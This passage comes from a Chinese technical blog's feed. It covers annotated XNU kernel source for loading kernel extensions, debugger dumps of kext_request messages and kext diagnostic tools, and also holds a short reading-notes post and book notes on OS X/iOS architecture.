OSSafeReleaseNULL(mkextPlistUncompressedData);</div><div class="line">    OSSafeReleaseNULL(errorString);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>load kext 的代码， 这个函数有个重载函数 通过第一个参数可以区分。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">OSReturn</div><div class="line">OSKext::loadKextWithIdentifier(</div><div class="line">    OSString          * kextIdentifier,</div><div class="line">    Boolean             allowDeferFlag,</div><div class="line">    Boolean             delayAutounloadFlag,</div><div class="line">    OSKextExcludeLevel  startOpt,</div><div class="line">    OSKextExcludeLevel  startMatchingOpt,</div><div class="line">    OSArray           * personalityNames)</div><div class="line">&#123;</div><div class="line">    OSReturn          result               = kOSReturnError;</div><div class="line">    OSReturn          pingResult           = kOSReturnError;</div><div class="line">    OSKext          * theKext              = <span class="literal">NULL</span>;  <span class="comment">// do not release</span></div><div class="line">    OSDictionary    * loadRequest          = <span class="literal">NULL</span>;  <span class="comment">// must release</span></div><div class="line">    <span class="keyword">const</span> OSSymbol  * kextIdentifierSymbol = <span class="literal">NULL</span>;  <span class="comment">// must release</span></div><div class="line"></div><div class="line">    IORecursiveLockLock(sKextLock);</div><div class="line"></div><div class="line">    OSKext::recordIdentifierRequest(kextIdentifier);</div><div class="line"></div><div class="line">    theKext = OSDynamicCast(OSKext, sKextsByID-&gt;getObject(kextIdentifier));</div><div class="line">    <span class="keyword">if</span> (!theKext) &#123;</div><div class="line">        <span class="keyword">if</span> (!allowDeferFlag) &#123;</div><div class="line">...</div><div class="line">             <span class="keyword">goto</span> finish;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!sKernelRequestsEnabled) &#123;</div><div class="line">            ...</div><div class="line">            <span class="keyword">goto</span> finish;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">       <span class="comment">/* Create a new request unless one is already sitting</span></div><div class="line">        * in sKernelRequests for this bundle identifier</div><div class="line">        * 创建一个 kernel 请求，请求去加载 kextIdentifier 对应的 kext</div><div class="line">        */</div><div class="line">        kextIdentifierSymbol = OSSymbol::withString(kextIdentifier);</div><div class="line">        <span class="keyword">if</span> (!sPostedKextLoadIdentifiers-&gt;containsObject(kextIdentifierSymbol)) &#123;</div><div class="line">            result = _OSKextCreateRequest(kKextRequestPredicateRequestLoad,   <span class="comment">//"Kext Load Request"</span></div><div class="line">                &amp;loadRequest);</div><div class="line">            <span class="keyword">if</span> (result != kOSReturnSuccess) &#123;</div><div class="line">                <span class="keyword">goto</span> finish;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (!_OSKextSetRequestArgument(loadRequest,</div><div class="line">                kKextRequestArgumentBundleIdentifierKey, kextIdentifier)) &#123;</div><div class="line"></div><div class="line">                result = kOSKextReturnNoMemory;</div><div class="line">                <span class="keyword">goto</span> finish;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (!sKernelRequests-&gt;setObject(loadRequest)) &#123;</div><div class="line">                result = kOSKextReturnNoMemory;</div><div class="line">                <span class="keyword">goto</span> finish;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (!sPostedKextLoadIdentifiers-&gt;setObject(kextIdentifierSymbol)) &#123;</div><div class="line">                result = kOSKextReturnNoMemory;</div><div class="line">                <span class="keyword">goto</span> finish;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 查看是否可以 load kext</span></div><div class="line">        pingResult = OSKext::pingKextd();</div><div class="line">        <span class="keyword">if</span> (pingResult == kOSKextReturnDisabled) &#123;</div><div class="line">        ...</div><div class="line">        &#125;</div><div class="line">        result = kOSKextReturnDeferred;</div><div class="line">        <span class="keyword">goto</span> finish;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 调用 OSKext 的 load</span></div><div class="line">    result = theKext-&gt;load(startOpt, startMatchingOpt, personalityNames);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (result != kOSReturnSuccess) &#123;</div><div class="line">        ...</div><div class="line">        OSKext::removeKext(theKext,</div><div class="line">            <span class="comment">/* terminateService/removePersonalities */</span> <span class="literal">true</span>);</div><div class="line">        <span class="keyword">goto</span> finish;</div><div class="line">    &#125;</div><div class="line">...</div><div class="line">finish:</div><div class="line">    OSSafeReleaseNULL(loadRequest);</div><div class="line">    OSSafeReleaseNULL(kextIdentifierSymbol);</div><div class="line">    IORecursiveLockUnlock(sKextLock);</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#define kMKEXTInfoDictionariesKey             &quot;_MKEXTInfoDictionaries&quot;</div><div class="line"></div><div class="line">#define kMKEXTBundlePathKey                   &quot;_MKEXTBundlePath&quot;</div><div class="line">#define kMKEXTExecutableRelativePathKey       &quot;_MKEXTExecutableRelativePath&quot;</div><div class="line">#define kMKEXTExecutableKey                   &quot;_MKEXTExecutable&quot;</div><div class="line"></div><div class="line">#define kMKEXTLoadRequestKey                  &quot;_MKEXTLoadRequest&quot;</div><div class="line">#define kMKEXTLoadRequestLoadKey              &quot;Load Kext&quot;</div><div class="line">#define kMKEXTLoadRequestStartKey             &quot;Start Kext&quot;</div><div class="line">#define kMKEXTLoadRequestAddPersonalitiesKey  &quot;Add Personalities&quot;</div><div class="line">#define kMKEXTLoadRequestDisableAutounloadKey &quot;Disable Autounload&quot;</div><div class="line"></div><div class="line">#define kKextRequestPredicateLoad                  &quot;Load&quot;</div></pre></td></tr></table></figure>
<p>总结一番：</p>
<ol>
<li><p>kext_request 的参数 requestIn的类型</p>
<ul>
<li>当 kextd 发出 load请求时, 向kext_request 发送一个 mkext文件</li>
<li>当 kextd 发出start/stop/…其他请求时,向kext_request 发送一个 XML文件</li>
</ul>
</li>
<li><p>mkext <code>Load</code> 需要2个过程，L1 阶段是从 mkext 中获取 Plist 以后就创建 OSKext 对象，并保存在 sKextsByID 字典中。L2 阶段从sKextsByID 中取出 OSKext，并调用 <code>OSKext-&gt;load</code> 方法</p>
</li>
<li><code>OSKext::initialize</code> 中给 kernel 创建 OSKext, 并初始化kext 全局管理对象（<code>sKextsByID, g_kernel_kmod_info, sLoadedKexts 等</code>）</li>
<li>当kext_request 发送 <code>Start</code> 时， 最终调用到<code>OSKext::start</code> 函数内, 会将控制权交给 kext的 xxx_start方法</li>
</ol>
<p>3/4 条会在下一篇中 给出代码分析。<br><img src="/include/img/bk-xnu/OSKext-initialize.png" alt="OSKext::initialize"></p>
<h4 id="调试-kext-request"><a href="#调试-kext-request" class="headerlink" title="调试 kext_request"></a>调试 kext_request</h4><p>这里调试的是 libsystem_kernel.dylib 中的kext_request 代码通过 mach msg 发送消息给上一节分析的是 xnu 内核中的 kext_request 代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">第一次请求</div><div class="line">0x7fe4e2805400: &quot;&lt;dict&gt;&lt;key&gt;Kext Request Predicate&lt;/key&gt;&lt;string&gt;Get Loaded Kext Info&lt;/string&gt;&lt;key&gt;Kext Request Arguments&lt;/key&gt;&lt;dict&gt;&lt;key&gt;Kext Request Info Keys&lt;/key&gt;&lt;array&gt;&lt;string&gt;CFBundleIdentifier&lt;/string&gt;&lt;string&gt;CFBundleVersion&lt;/string&gt;&lt;string&gt;OSBundleCompatibleVersion&lt;/string&gt;&lt;string&gt;OSBundleIsInterface&lt;/string&gt;&lt;string&gt;OSKernelResource&lt;/string&gt;&lt;string&gt;OSBundleCPUType&lt;/string&gt;&lt;string&gt;OSBundleCPUSubtype&lt;/string&gt;&lt;string&gt;OSBundlePath&lt;/string&gt;&lt;string&gt;OSBundleUUID&lt;/string&gt;&lt;string&gt;OSBundleStarted&lt;/string&gt;&lt;string&gt;OSBundleLoadTag&lt;/string&gt;&lt;string&gt;OSBundleLoadAddress&lt;/string&gt;&lt;string&gt;OSBundleLoadSize&lt;/string&gt;&lt;string&gt;OSBundleWiredSize&lt;/string&gt;&lt;string&gt;OSBundlePrelinked&lt;/string&gt;&lt;string&gt;OSBundleDependencies&lt;/string&gt;&lt;string&gt;OSBundleRetainCount&lt;/string&gt;&lt;/array&gt;&lt;key&gt;CFBundleIdentifier&lt;/key&gt;&lt;array&gt;&lt;string&gt;com.apple.driver.KextExcludeList&lt;/string&gt;&lt;/array&gt;&lt;/dict&gt;&lt;/dict&gt;&quot;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">第三次</div><div class="line">&lt;dict&gt;</div><div class="line">  &lt;key&gt;Kext Request Predicate&lt;/key&gt;</div><div class="line">  &lt;string&gt;Load&lt;/string&gt;</div><div class="line">  &lt;key&gt;Kext Request Arguments&lt;/key&gt;</div><div class="line">  &lt;dict&gt;</div><div class="line">    &lt;key&gt;Start Exclude Level&lt;/key&gt;</div><div class="line">    &lt;integer ID=&quot;0&quot; size=&quot;8&quot;&gt;0x0&lt;/integer&gt;</div><div class="line">    &lt;key&gt;Start Matching Exclude Level&lt;/key&gt;</div><div class="line">    &lt;integer IDREF=&quot;0&quot; /&gt;</div><div class="line">    &lt;key&gt;CFBundleIdentifier&lt;/key&gt;</div><div class="line">    &lt;string ID=&quot;1&quot;&gt;com.apple.filesystems.ntfs&lt;/string&gt;</div><div class="line">  &lt;/dict&gt;</div><div class="line">  &lt;key&gt;_MKEXTInfoDictionaries&lt;/key&gt;</div><div class="line">  &lt;array&gt;</div><div class="line">    &lt;dict&gt;</div><div class="line">      &lt;key&gt;CFBundleName&lt;/key&gt;</div><div class="line">      &lt;string&gt;NTFS File System Extension&lt;/string&gt;</div><div class="line">      &lt;key&gt;DTXcode&lt;/key&gt;</div><div class="line">      &lt;string&gt;0720&lt;/string&gt;</div><div class="line">      &lt;key&gt;DTSDKName&lt;/key&gt;</div><div class="line">      &lt;string&gt;macosx10.11internal&lt;/string&gt;</div><div class="line">      &lt;key&gt;DTSDKBuild&lt;/key&gt;</div><div class="line">      &lt;string&gt;15C45&lt;/string&gt;</div><div class="line">      &lt;key&gt;CFBundleDevelopmentRegion&lt;/key&gt;</div><div class="line">      &lt;string&gt;English&lt;/string&gt;</div><div class="line">      &lt;key&gt;CFBundleVersion&lt;/key&gt;</div><div class="line">      &lt;string ID=&quot;2&quot;&gt;3.13&lt;/string&gt;</div><div class="line">      &lt;key&gt;BuildMachineOSBuild&lt;/key&gt;</div><div class="line">      &lt;string&gt;15A284&lt;/string&gt;</div><div class="line">      &lt;key&gt;_MKEXTExecutableRelativePath&lt;/key&gt;</div><div class="line">      &lt;string&gt;Contents/MacOS/ntfs&lt;/string&gt;</div><div class="line">      &lt;key&gt;CFBundlePackageType&lt;/key&gt;</div><div class="line">      &lt;string&gt;KEXT&lt;/string&gt;</div><div class="line">      &lt;key&gt;CFBundleShortVersionString&lt;/key&gt;</div><div class="line">      &lt;string IDREF=&quot;2&quot; /&gt;</div><div class="line">      &lt;key&gt;CFBundleSupportedPlatforms&lt;/key&gt;</div><div class="line">      &lt;array&gt;</div><div class="line">        &lt;string&gt;MacOSX&lt;/string&gt;</div><div class="line">      &lt;/array&gt;</div><div class="line">      &lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;</div><div class="line">    &lt;/dict&gt;</div><div class="line">  &lt;/array&gt;</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure>
<h3 id="kext-相关工具"><a href="#kext-相关工具" class="headerlink" title="kext 相关工具"></a>kext 相关工具</h3><h4 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h4><table>
<thead>
<tr>
<th>命令</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>jtool</td>
<td>分析 Mach-O格式</td>
</tr>
<tr>
<td>joker</td>
<td>(不能用）</td>
</tr>
</tbody>
</table>
<p>联动内核？ 直接使用物理内存</p>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>kextd</td>
<td>用户空动态加载kext 的守护进程，被 launchd 启动</td>
</tr>
<tr>
<td>kextfind</td>
<td>通过属性 和 标准查询 kext</td>
</tr>
<tr>
<td>kextlibs</td>
<td>解析 kext的依赖</td>
</tr>
<tr>
<td>kextload</td>
<td>kext 加载器</td>
</tr>
<tr>
<td>kextunload</td>
<td>kext 卸载器</td>
</tr>
<tr>
<td>kextutil</td>
<td>检查 kext 的 bug, 等功能</td>
</tr>
<tr>
<td>kextstat</td>
<td>查看已经安装的 kext</td>
</tr>
<tr>
<td>————–</td>
<td>————–</td>
</tr>
<tr>
<td>ioreg</td>
<td>show I/O Kit registry，”man ioreg”</td>
</tr>
<tr>
<td>ioclasscount</td>
<td>内核对象的内存管理是基于引用计数，该工具可以用来打印所有已加载的内核对象的引用计数个数，便于调试内存泄露</td>
</tr>
<tr>
<td>sudo zprint</td>
<td>查看 kalloc 分配的內存域 (类似于 slab 缓存)</td>
</tr>
<tr>
<td>Console</td>
<td>查看 system.log</td>
</tr>
<tr>
<td>IORegistryExplorer</td>
<td>查看 kext IOLog 輸出信息</td>
</tr>
<tr>
<td>USB Prober</td>
<td>查看 usb 使用情況</td>
</tr>
<tr>
<td>————–</td>
<td>————–</td>
</tr>
<tr>
<td>mkextunpack</td>
<td>解包 mkext</td>
</tr>
<tr>
<td>kextcache</td>
</tr>
</tbody>
</table>
<h4 id="kextstat"><a href="#kextstat" class="headerlink" title="kextstat"></a>kextstat</h4><p>kextstat 查看系统(/System/Library/Extensions下的 kext 不一定全部加载了)当前加载的 kext。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">blog git:(master) ✗ kextstat</div><div class="line">Index Refs Address            Size       Wired      Name (Version) UUID &lt;Linked Against&gt;</div><div class="line">    1   94 0xffffff7f80a46000 0x9d30     0x9d30     com.apple.kpi.bsd (16.4.0) 548007FE-B217-4499-8640-238BC24F4A17</div><div class="line">    2    8 0xffffff7f80e59000 0x3940     0x3940     com.apple.kpi.dsep (16.4.0) 38FEF282-1288-42F3-8E55-EDD04053B20B</div><div class="line">    3  119 0xffffff7f80a04000 0x21040    0x21040    com.apple.kpi.iokit (16.4.0) EA3A39EE-499F-44C3-88F2-334FEB308226</div><div class="line">    4  126 0xffffff7f80a26000 0xd200     0xd200     com.apple.kpi.libkern (16.4.0) 677B5452-B294-43D3-A562-F13502C04C54</div><div class="line">    5  114 0xffffff7f80a00000 0x3dd0     0x3dd0     com.apple.kpi.mach (16.4.0) 2A128386-C535-4026-B9D7-E91D3360CEF4</div><div class="line">    6   62 0xffffff7f80a34000 0xba10     0xba10     com.apple.kpi.private (16.4.0) F8C31C2F-2831-4680-90DF-97A2EA6DE9F0</div><div class="line">    7   76 0xffffff7f80a40000 0x5890     0x5890     com.apple.kpi.unsupported (16.4.0) C8C39C9E-83FE-4274-BA90-9535845EFF9C</div><div class="line">    8    7 0xffffff7f80e60000 0xa9000    0xa9000    com.apple.kec.corecrypto (1.0) 25C67059-A2B6-328F-BCCF-F81CC7FFC10F &lt;7 6 5 4 3 1&gt;</div><div class="line">    9    0 0xffffff7f80fbb000 0xf000     0xf000     com.apple.kec.pthread (1) 479F2E9E-1F15-3D76-A407-DB04C1277527 &lt;7 6 5 4 1&gt;</div><div class="line">   10    1 0xffffff7f80ff1000 0xb000     0xb000     com.apple.kec.Libm (1) 51D82C5F-0248-334D-ADC6-5861BBB83C97 &lt;4&gt;</div><div class="line">   11   27 0xffffff7f80ffc000 0x9000     0x9000     com.apple.iokit.IOACPIFamily (1.4) 4F7FB6AD-2498-3F71-827C-ED7AA4BF2511 &lt;7 6 4 3&gt;</div><div class="line">   12   30 0xffffff7f80b32000 0x34000    0x34000    com.apple.iokit.IOPCIFamily (2.9) 57960DC6-4099-31BC-9B47-52CD647779C7 &lt;7 6 5 4 3&gt;</div><div class="line">   13    2 0xffffff7f831d7000 0x60000    0x60000    com.apple.driver.AppleACPIPlatform (5.0) 867C81BE-EA01-3A65-89F4-06D78E6514CA &lt;12 11 7 6 5 4 3 1&gt;</div><div class="line">   14    1 0xffffff7f812ae000 0xb000     0xb000     com.apple.driver.AppleFDEKeyStore (28.30) EA5D0966-E8EA-337A-98EB-195806E8F723 &lt;8 7 6 5 4 3 1&gt;</div><div class="line">   15    4 0xffffff7f816a9000 0x7000     0x7000     com.apple.iokit.IOReportFamily (31) B14DC3D3-7250-3DA3-BF50-C666EBEDAF4C &lt;5 4 3&gt;</div><div class="line">   16    7 0xffffff7f80a50000 0x27000    0x27000    com.apple.iokit.IOStorageFamily (2.1) 3238C6A2-A948-378E-9C53-3883089C1B52 &lt;7 6 5 4 3 1&gt;</div><div class="line">   17    0 0xffffff7f81779000 0x190</div></pre></td></tr></table></figure></p>
<p>第1列 Index是 kext 在表中的索引<br>第2列 Refs 显示当前 kext 依赖的 kext 的个数，每一项末尾尖括号&lt;&gt;内是依赖的 kext 的index。</p>
<p>从依赖关系树状图可以看出，树根部是1-7这7个 kext（kpi.*）</p>
<h4 id="zprint"><a href="#zprint" class="headerlink" title="zprint"></a>zprint</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sh-3.2# zprint | grep port</div><div class="line"></div><div class="line">                    elem         cur         max        cur         max         cur  alloc  alloc</div><div class="line">zone name                   size        size        size      #elts       #elts       inuse   size  count</div><div class="line"></div><div class="line">ipc.ports                    336       2072K      24924K       6314       75958        5779     4K     12   C</div><div class="line">ipc.port.sets                 88         40K       1868K        465       21736         388     8K     93   C</div><div class="line">ipc.task.importance          168         24K       4032K        146       24576         106    12K     73   C</div><div class="line">ipc.importance.inherit        88          8K       2112K         93       24576           2     8K     93   C</div><div class="line">com.apple.iokit.IOReportFamily</div></pre></td></tr></table></figure>
<h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-03-17</td>
<td>kext_request Load源代码分析</td>
</tr>
<tr>
<td>2017-03-20</td>
<td>梳理文章, 下一篇专门分析 OSKext 中的几个函数 load, start,withMkext2Info…</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>3月逻辑思维</title>
    <link href="http://yoursite.com/2017/03/15/3%E6%9C%88%E9%80%BB%E8%BE%91%E6%80%9D%E7%BB%B4/"/>
    <id>http://yoursite.com/2017/03/15/3月逻辑思维/</id>
    <published>2017-03-15T02:50:08.000Z</published>
    <updated>2017-03-15T04:50:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>阅读+记录<br><a id="more"></a></p>
<h3 id="关键词：投资"><a href="#关键词：投资" class="headerlink" title="关键词：投资"></a>关键词：投资</h3><p>几大误区汇总：<br>贵金属，大宗商品在短期投资浮动交大，但是长期的利润很低。<br>买黄金避险一定要买实物黄金，而不是纸面的符号。<br>买基金理财公司（基金经历）掠夺的报酬非常高，并且他们的判断力并不准确。</p>
<hr>
<h3 id="关键词：活力"><a href="#关键词：活力" class="headerlink" title="关键词：活力"></a>关键词：活力</h3><p>在日本同一年龄段的人他们的收入是差不多的。大家彼此心知肚明。<br>这样的社会既没有明显的不公平，也没有明显的机会。<br>人人都没有妄念的社会是一个丧失活力的社会？</p>
<hr>
<h3 id="关键词：效果"><a href="#关键词：效果" class="headerlink" title="关键词：效果"></a>关键词：效果</h3><p>举例：去旅游到底是精密计划的团队旅游，还是定一个大体的目标，然后就出发，在路上根据随时的性质及时调整，跟随偶发的体验和奇遇更有效果？<br>案例中的效果的含义概括成几个词：快乐、减压、刺激、印象深刻。</p>
<p>时间管理并不等于个人管理。时间管理顶多是让你避免浪费时间，但是不能保障你处于最好的状态。<br><strong>追求效果，而不是追求效率</strong> 管理首先就是要去掉一切不创造价值的环节。<br>我们做个人管理的时候，一定要以效果作为目标，与此同时要管理能量，而不是管理时间。</p>
<h4 id="一句提醒自己的话："><a href="#一句提醒自己的话：" class="headerlink" title="一句提醒自己的话："></a>一句提醒自己的话：</h4><pre><code>我现在做的是不是只是让自己在电梯上多走几圈，是不是正在一个高效率的实际上 低效率或者无效率的状态里头？
</code></pre><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>小团队的行为模式：目标–行动–反馈–调整</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;阅读+记录&lt;br&gt;
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
      <category term="逻辑思维" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E6%80%9D%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>XNU内核设计--基础篇</title>
    <link href="http://yoursite.com/2017/03/13/XNU%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>http://yoursite.com/2017/03/13/XNU内核设计-基础篇/</id>
    <published>2017-03-13T05:47:55.000Z</published>
    <updated>2017-03-15T07:41:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>《深入解析MAC OS X &amp; iOS 操作系统》- 第 二 章: 合众为一：OSX &amp; iOS 使用的技术</p>
</blockquote>
<a id="more"></a>
<h2 id="重点知识"><a href="#重点知识" class="headerlink" title="重点知识"></a>重点知识</h2><p>本章重点介绍 <strong>架构设计原则</strong> 和 <strong>基础模块构建</strong>。</p>
<p><img src="/include/img/bk-xnu/arch1.png" alt=""></p>
<p>架构采用4层架构: 用户体验层 –&gt; Darwin。<br>基础模块: 突出架构中的核心；会从4层架构中抽取来介绍的模块： Darwin、bundle、应用 APP、用户体验层–Aqua/QuickLook/Spotlight 等。</p>
<h2 id="OSX-amp-iOS框架设计"><a href="#OSX-amp-iOS框架设计" class="headerlink" title="OSX &amp; iOS框架设计"></a>OSX &amp; iOS框架设计</h2><p><img src="/include/img/bk-xnu/arch2.png" alt=""><br>IOS/OSX 4层架构.</p>
<p>上面3 层闭源，Darwin 是开源的。</p>
<p>darwin 的层次 &amp;&amp; 架构</p>
<ol>
<li>层次</li>
</ol>
<p><img src="/include/img/bk-xnu/xnu-arch.jpg" alt=""></p>
<p>darwin -&gt; xnu (混合内核) -&gt; bsd （POSIX标准） -&gt; mach (微内核) + iokit 组件</p>
<ol>
<li>架构<br><img src="/include/img/bk-xnu/arch3.png" alt=""></li>
</ol>
<p>Object-C 编写的 app 只需 要使用框架Cocoa的 接口。</p>
<h2 id="组件-模块"><a href="#组件-模块" class="headerlink" title="组件/模块"></a>组件/模块</h2><p>组件中也包含了框架，因为每个组件自身存在框架，并且组件之间的联系也是系统框架（指 OSX/iOS系统）的一部分。</p>
<h3 id="用户体验层"><a href="#用户体验层" class="headerlink" title="用户体验层"></a>用户体验层</h3><p>主要包括一下组件(介绍 osx+ios 对应的组件):</p>
<ul>
<li>Aqua</li>
<li>Quick look</li>
<li>spotlight</li>
<li>Accessibility 选项</li>
</ul>
<h4 id="Aqua-–-OSX-GUI"><a href="#Aqua-–-OSX-GUI" class="headerlink" title="Aqua – OSX GUI"></a>Aqua – OSX GUI</h4><p>有2条流水线 （是顺序执行的关系）：<br>【1】开启GUI<br>由launchd 启动 -&gt; WindowServer -&gt; …-&gt; CGXServer fork 子进程</p>
<p>【2】启动交互式登录<br>launchd -&gt; LoginWindow 进程</p>
<p>模块所在 路径<br><code>/System/Library/Frameworks/ApplicationServices.framework/Frameworks/CoreGraphics.framework/Resources/WindowServer</code></p>
<h4 id="Quick-look-–-预览"><a href="#Quick-look-–-预览" class="headerlink" title="Quick look – 预览"></a>Quick look – 预览</h4><p>采用插件扩展架构，大部分工作由插件完成。</p>
<p>插件的文件格式 后缀<strong>.qlgenerator</strong>的 bundle.</p>
<p>插件的组成：特殊编译的二进制程序 + 配置文件<br>特殊编译的二进制程序 的入口点不是 main 而是 QuickLookGeneratorPluginFactory 入口点。<br>配置文件：将 插件和对应的文件类型关联起来。</p>
<p>文件类型 是什么？<br>UTI (Uniform Type Identifier)？ 逆 DNS 表示法？</p>
<p>quicklookd “QuickLook 服务器”， 通过 /System/Library/。。。。/com.apple.quicklook.plist 文件在登录时启动。</p>
<p>工具：<br>qlmanage 插件管理工具，控制后台服务。</p>
<p>使用工具<br>qlmanage -m</p>
<p><img src="/include/img/bk-xnu/qlmanage.png" alt="qlmanage"><br>qlmanage  显示 管理的插件（入口，文件，版本）</p>
<h4 id="spotlight-–-快速搜索工具"><a href="#spotlight-–-快速搜索工具" class="headerlink" title="spotlight – 快速搜索工具"></a>spotlight – 快速搜索工具</h4><p>其核心是一个 mds 索引服务器，记录了系统所有文件（支持的文件类型）的 元数据。<br>在 创建、修改 和删除 事件发生时，内核通知 mds。 通知机制是 fsevents。</p>
<p>mds 负责接受消息，具体干活的是 mdworker 进程，负责将各种元数据信息导入数据库。<br>mdworker 可以加载 spotlight importer 导入器从文件中 提取元数据。</p>
<p>导入器 有系统提供的在 /System/Library/Spotlight 目录，也有用户自定义的在/Library/Spotlight/。</p>
<p>演示 使用 xcode 创建 spotlight 导入器工程<br><img src="/include/img/bk-xnu/importer.png" alt="importer"><br><img src="/include/img/bk-xnu/importerdev.png" alt="importer"></p>
<p>工具：</p>
<ul>
<li>mdutil</li>
<li>mdfind</li>
<li>mdimport</li>
<li>mdls</li>
<li>mdcheckschema</li>
<li>mddiagnose</li>
</ul>
